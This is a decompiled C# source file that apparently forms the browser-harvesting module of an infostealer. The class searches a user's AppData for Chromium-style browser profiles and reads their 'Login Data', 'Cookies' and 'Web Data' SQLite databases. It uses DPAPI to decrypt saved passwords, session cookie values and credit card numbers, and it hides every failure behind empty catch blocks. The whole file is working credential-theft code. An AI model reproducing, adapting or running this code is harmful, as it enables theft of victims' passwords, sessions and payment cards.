using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Threading;
using NoiseMe.Drags.App.Data.Hlps;
using NoiseMe.Drags.App.Data.SQLite;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;

namespace NoiseMe.Drags.App.Data.Recovery
{
	// Token: 0x0200018A RID: 394
	public class Bip : GH9kf<BrowserProfile>
	{
		// Token: 0x06000C98 RID: 3224 RVA: 0x0002675C File Offset: 0x0002495C
		public List<BrowserProfile> EnumerateData()
		{
			List<BrowserProfile> browserProfiles = new List<BrowserProfile>();
			try
			{
				int countCompleted = 0;
				object locker = new object();
				List<string> profile = this.GetProfile();
				using (List<string>.Enumerator enumerator = profile.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						string rootPath = enumerator.Current;
						new Thread(delegate()
						{
							BrowserProfile browserProfile = new BrowserProfile();
							try
							{
								string fullName = new FileInfo(rootPath).Directory.FullName;
								string text = rootPath.Contains(strg.RoamingAppData) ? this.GetRoadData(fullName) : this.GetLclName(fullName);
								if (!string.IsNullOrEmpty(text))
								{
									text = text[0].ToString().ToUpper() + text.Remove(0, 1);
									string name = this.GetName(fullName);
									if (!string.IsNullOrEmpty(name))
									{
										browserProfile.Name = text;
										browserProfile.Profile = name;
										browserProfile.BrowserCookies = this.EnumCook(fullName).IsNull<List<BrowserCookie>>();
										browserProfile.BrowserCredendtials = this.GetCredentials(fullName).IsNull<List<BrowserCredendtial>>();
										browserProfile.BrowserAutofills = this.EnumFills(fullName).IsNull<List<BrowserAutofill>>();
										browserProfile.BrowserCreditCards = this.EnumCC(fullName).IsNull<List<BrowserCreditCard>>();
									}
								}
							}
							catch
							{
							}
							object locker = locker;
							lock (locker)
							{
								List<BrowserCookie> browserCookies = browserProfile.BrowserCookies;
								if (browserCookies == null || browserCookies.Count <= 0)
								{
									List<BrowserCredendtial> browserCredendtials = browserProfile.BrowserCredendtials;
									if (browserCredendtials == null || browserCredendtials.Count <= 0)
									{
										List<BrowserCreditCard> browserCreditCards = browserProfile.BrowserCreditCards;
										if (browserCreditCards == null || browserCreditCards.Count <= 0)
										{
											List<BrowserAutofill> browserAutofills = browserProfile.BrowserAutofills;
											if (browserAutofills == null || browserAutofills.Count <= 0)
											{
												goto IL_1CA;
											}
										}
									}
								}
								browserProfiles.Add(browserProfile);
								IL_1CA:
								int countCompleted = countCompleted;
								countCompleted++;
							}
						}).Start();
					}
				}
				while (countCompleted != profile.Count)
				{
				}
			}
			catch
			{
			}
			return browserProfiles;
		}

		// Token: 0x06000C99 RID: 3225 RVA: 0x0002682C File Offset: 0x00024A2C
		public List<BrowserCredendtial> GetCredentials(string profilePath)
		{
			List<BrowserCredendtial> list = new List<BrowserCredendtial>();
			try
			{
				string text = Path.Combine(profilePath, "Login Data");
				if (!File.Exists(text))
				{
					return list;
				}
				CNT cnt = new CNT(rcvr.CreateTempCopy(text));
				cnt.ReadTable("logins");
				for (int i = 0; i < cnt.RowLength; i++)
				{
					BrowserCredendtial browserCredendtial = new BrowserCredendtial();
					try
					{
						browserCredendtial = this.ReadData(cnt, i);
					}
					catch
					{
					}
					if (browserCredendtial.Login.IsNotNull<string>() && browserCredendtial.Login != "UNKNOWN" && browserCredendtial.Password != "UNKNOWN" && browserCredendtial.URL != "UNKNOWN")
					{
						list.Add(browserCredendtial);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000C9A RID: 3226 RVA: 0x00026914 File Offset: 0x00024B14
		public List<BrowserCookie> EnumCook(string profilePath)
		{
			List<BrowserCookie> list = new List<BrowserCookie>();
			try
			{
				string text = Path.Combine(profilePath, "Cookies");
				if (!File.Exists(text))
				{
					return list;
				}
				CNT cnt = new CNT(rcvr.CreateTempCopy(text));
				cnt.ReadTable("cookies");
				for (int i = 0; i < cnt.RowLength; i++)
				{
					BrowserCookie browserCookie = null;
					try
					{
						browserCookie = new BrowserCookie
						{
							Host = cnt.ParseValue(i, "host_key").Trim(),
							Http = (cnt.ParseValue(i, "httponly") == "1"),
							Path = cnt.ParseValue(i, "path").Trim(),
							Secure = (cnt.ParseValue(i, "secure") == "1"),
							Expires = cnt.ParseValue(i, "expires_utc").Trim(),
							Name = cnt.ParseValue(i, "name").Trim(),
							Value = rcvr.DecryptBlob(cnt.ParseValue(i, "encrypted_value"), DataProtectionScope.CurrentUser, null).Trim()
						};
					}
					catch (Exception)
					{
					}
					if (browserCookie != null)
					{
						list.Add(browserCookie);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000C9B RID: 3227 RVA: 0x00026A88 File Offset: 0x00024C88
		public List<BrowserAutofill> EnumFills(string profilePath)
		{
			List<BrowserAutofill> list = new List<BrowserAutofill>();
			try
			{
				string text = Path.Combine(profilePath, "Web Data");
				if (!File.Exists(text))
				{
					return list;
				}
				CNT cnt = new CNT(rcvr.CreateTempCopy(text));
				cnt.ReadTable("autofill");
				for (int i = 0; i < cnt.RowLength; i++)
				{
					BrowserAutofill browserAutofill = null;
					try
					{
						browserAutofill = new BrowserAutofill
						{
							Name = cnt.ParseValue(i, "name").Trim(),
							Value = cnt.ParseValue(i, "value").Trim()
						};
					}
					catch
					{
					}
					if (browserAutofill != null)
					{
						list.Add(browserAutofill);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000C9C RID: 3228 RVA: 0x00026B50 File Offset: 0x00024D50
		public List<BrowserCreditCard> EnumCC(string profilePath)
		{
			List<BrowserCreditCard> list = new List<BrowserCreditCard>();
			try
			{
				string text = Path.Combine(profilePath, "Web Data");
				if (!File.Exists(text))
				{
					return list;
				}
				CNT cnt = new CNT(rcvr.CreateTempCopy(text));
				cnt.ReadTable("credit_cards");
				for (int i = 0; i < cnt.RowLength; i++)
				{
					BrowserCreditCard browserCreditCard = null;
					try
					{
						browserCreditCard = new BrowserCreditCard
						{
							Holder = cnt.ParseValue(i, "name_on_card").Trim(),
							ExpirationMonth = Convert.ToInt32(cnt.ParseValue(i, "expiration_month").Trim()),
							ExpirationYear = Convert.ToInt32(cnt.ParseValue(i, "expiration_year").Trim()),
							CardNumber = rcvr.DecryptBlob(cnt.ParseValue(i, "card_number_encrypted"), DataProtectionScope.CurrentUser, null).Trim()
						};
					}
					catch
					{
					}
					if (browserCreditCard != null)
					{
						list.Add(browserCreditCard);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000C9D RID: 3229 RVA: 0x00026C64 File Offset: 0x00024E64
		private BrowserCredendtial ReadData(CNT manager, int row)
		{
			BrowserCredendtial browserCredendtial = new BrowserCredendtial();
			try
			{
				browserCredendtial.URL = manager.ParseValue(row, "origin_url").Trim();
				browserCredendtial.Login = manager.ParseValue(row, "username_value").Trim();
				browserCredendtial.Password = rcvr.DecryptBlob(manager.ParseValue(row, "password_value"), DataProtectionScope.CurrentUser, null).Trim();
			}
			catch
			{
			}
			finally
			{
				browserCredendtial.Login = (string.IsNullOrEmpty(browserCredendtial.Login) ? "UNKNOWN" : browserCredendtial.Login);
				browserCredendtial.Password = (string.IsNullOrEmpty(browserCredendtial.Password) ? "UNKNOWN" : browserCredendtial.Password);
				browserCredendtial.URL = (string.IsNullOrEmpty(browserCredendtial.URL) ? "UNKNOWN" : browserCredendtial.URL);
			}
			return browserCredendtial;
		}

		// Token: 0x06000C9E RID: 3230 RVA: 0x00026D48 File Offset: 0x00024F48
		private string GetName(string path)
		{
			try
			{
				string[] array = path.Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				if (array[array.Length - 2] == "User Data")
				{
					return array[array.Length - 1];
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000C9F RID: 3231 RVA: 0x00026DA4 File Offset: 0x00024FA4
		private string GetRoadData(string path)
		{
			try
			{
				return path.Split(new string[]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries)[0];
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x06000CA0 RID: 3232 RVA: 0x00026DF8 File Offset: 0x00024FF8
		private string GetLclName(string path)
		{
			try
			{
				string[] array = path.Split(new string[]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				return array[0] + "_[" + array[1] + "]";
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x06000CA1 RID: 3233 RVA: 0x00026E60 File Offset: 0x00025060
		private List<string> GetProfile()
		{
			List<string> list = new List<string>();
			try
			{
				list.AddRange(rcvr.FindPaths(strg.RoamingAppData, 4, 1, new string[]
				{
					"Login Data",
					"Web Data",
					"Cookies"
				}));
				list.AddRange(rcvr.FindPaths(strg.LocalAppData, 4, 1, new string[]
				{
					"Login Data",
					"Web Data",
					"Cookies"
				}));
			}
			catch
			{
			}
			return list;
		}
	}
}
